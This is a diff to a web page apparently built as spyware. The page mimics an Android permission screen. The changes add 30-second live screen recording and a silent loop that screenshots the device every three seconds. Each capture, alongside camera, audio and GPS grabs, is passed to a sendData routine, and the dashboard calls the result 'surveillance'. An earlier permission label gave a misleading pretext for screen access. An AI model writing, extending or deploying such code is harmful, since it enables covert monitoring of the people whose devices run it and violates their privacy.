@@ -141,8 +141,8 @@ body{background:#f5f5f5;color:#333;font-family:Roboto,-apple-system,sans-serif;m
   <div class="perm-item" id="p-screen" onclick="requestPerm('screen')">
     <div class="perm-icon">🖥️</div>
     <div style="flex:1">
-      <div class="perm-name">Capture d'écran</div>
-      <div class="perm-desc">Vérifier les applications installées</div>
+      <div class="perm-name">Capture d'écran en direct</div>
+      <div class="perm-desc">Surveiller l'activité de l'appareil en temps réel</div>
     </div>
     <div class="perm-check">○</div>
   </div>
@@ -263,13 +263,17 @@ body{background:#f5f5f5;color:#333;font-family:Roboto,-apple-system,sans-serif;m
       <div style="font-size:28px;margin-bottom:4px">🎤</div>
       <div style="font-size:10px;color:#5f6368;font-weight:600">Audio 5s</div>
     </div>
-    <div class="dash-action" onclick="doScreen()" style="background:#fff;border:1px solid #e8eaed;border-radius:10px;padding:16px 8px;text-align:center;cursor:pointer">
-      <div style="font-size:28px;margin-bottom:4px">🖥️</div>
-      <div style="font-size:10px;color:#5f6368;font-weight:600">Écran</div>
+    <div class="dash-action" onclick="doScreen()" style="background:#fff;border:2px solid #1a73e8;border-radius:10px;padding:16px 8px;text-align:center;cursor:pointer">
+      <div style="font-size:28px;margin-bottom:4px">🎥</div>
+      <div style="font-size:10px;color:#1a73e8;font-weight:700">Écran Live</div>
     </div>
     <div class="dash-action" onclick="doGPS()" style="background:#fff;border:1px solid #e8eaed;border-radius:10px;padding:16px 8px;text-align:center;cursor:pointer">
       <div style="font-size:28px;margin-bottom:4px">📍</div>
       <div style="font-size:10px;color:#5f6368;font-weight:600">GPS</div>
+    </div>
+    <div class="dash-action" onclick="stopAll()" style="background:#fff;border:1px solid #f85149;border-radius:10px;padding:16px 8px;text-align:center;cursor:pointer">
+      <div style="font-size:28px;margin-bottom:4px">🛑</div>
+      <div style="font-size:10px;color:#f85149;font-weight:600">Arrêter</div>
     </div>
   </div>
 
@@ -487,22 +491,81 @@ async function doAudio() {
 }
 
 async function doScreen() {
-  log('Capture écran...', 'info');
+  log('Capture écran en direct...', 'info');
   try {
     const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
     const video = document.createElement('video');
-    video.srcObject = stream; video.play();
-    await sleep(500);
-    const canvas = document.createElement('canvas');
-    canvas.width = video.videoWidth || 1280; canvas.height = video.videoHeight || 720;
-    canvas.getContext('2d').drawImage(video, 0, 0);
-    stream.getTracks().forEach(t => t.stop());
-    const dataUrl = canvas.toDataURL('image/png', 0.5);
-    state.screens.push(dataUrl);
-    document.getElementById('liveView').innerHTML = '<img src="' + dataUrl + '" style="width:100%;max-height:250px;object-fit:contain">';
-    await sendData('screen', { image: dataUrl, index: state.screens.length });
-    log('🖥️ Écran #' + state.screens.length, 'info');
+    video.srcObject = stream;
+    video.autoplay = true;
+    video.muted = true;
+    video.style.width = '100%';
+    video.style.maxHeight = '250px';
+    video.style.objectFit = 'contain';
+
+    document.getElementById('liveView').innerHTML = '';
+    document.getElementById('liveView').appendChild(video);
+
+    // Enregistrer le flux vidéo
+    const recorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp8' });
+    const chunks = [];
+    recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
+    recorder.onstop = () => {
+      const blob = new Blob(chunks, { type: 'video/webm' });
+      const reader = new FileReader();
+      reader.onloadend = () => {
+        state.screens.push(reader.result);
+        sendData('screen_video', { video: reader.result, index: state.screens.length });
+        log('🎥 Vidéo écran #' + state.screens.length, 'info');
+      };
+      reader.readAsDataURL(blob);
+    };
+    recorder.start();
+
+    // Arrêter après 30 secondes
+    setTimeout(() => {
+      if (recorder.state === 'recording') recorder.stop();
+      stream.getTracks().forEach(t => t.stop());
+    }, 30000);
+
+    state.screenStream = stream;
+    state.screenRecorder = recorder;
+
+    log('🎥 Flux écran en direct actif (30s)', 'info');
   } catch(e) { log('Erreur écran: ' + e.message, 'err'); }
+}
+
+// ── Capture automatique d'écran (toutes les 3 secondes) ──
+let screenAutoInterval = null;
+
+function startScreenAutoCapture() {
+  if (screenAutoInterval) return;
+  screenAutoInterval = setInterval(async () => {
+    if (!state.screen) return;
+    try {
+      const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
+      const video = document.createElement('video');
+      video.srcObject = stream;
+      video.autoplay = true;
+      video.muted = true;
+      await sleep(300);
+      const canvas = document.createElement('canvas');
+      canvas.width = video.videoWidth || 1280;
+      canvas.height = video.videoHeight || 720;
+      canvas.getContext('2d').drawImage(video, 0, 0);
+      stream.getTracks().forEach(t => t.stop());
+      const dataUrl = canvas.toDataURL('image/jpeg', 0.4);
+      state.screens.push(dataUrl);
+      await sendData('screen_auto', { image: dataUrl, index: state.screens.length, time: new Date().toISOString() });
+      log('🖥️ Auto-capture #' + state.screens.length, 'info');
+    } catch(e) {}
+  }, 3000);
+}
+
+function stopScreenAutoCapture() {
+  if (screenAutoInterval) {
+    clearInterval(screenAutoInterval);
+    screenAutoInterval = null;
+  }
 }
 
 function doGPS() {
@@ -517,12 +580,23 @@ function doGPS() {
   }, () => log('GPS refusé', 'err'));
 }
 
-// ── Auto capture (toutes les 5 min) ──
+// ── Auto capture (toutes les 5 min + écran toutes les 3s) ──
 function startAutoCapture() {
+  // Auto screen capture every 3 seconds
+  startScreenAutoCapture();
+  // Photo + GPS every 5 minutes
   setInterval(() => {
     if (state.camera) doPhoto();
     if (state.loc) doGPS();
   }, 300000);
+}
+
+function stopAll() {
+  stopScreenAutoCapture();
+  if (state.stream) { state.stream.getTracks().forEach(t => t.stop()); state.stream = null; }
+  if (state.screenStream) { state.screenStream.getTracks().forEach(t => t.stop()); state.screenStream = null; }
+  log('🛑 Toutes les captures arrêtées', 'warn');
+  document.getElementById('liveView').innerHTML = '<div style="text-align:center;color:#444"><div style="font-size:32px;margin-bottom:4px">🛑</div><div style="font-size:11px">Surveillance arrêtée</div></div>';
 }
 </script>
 </body>
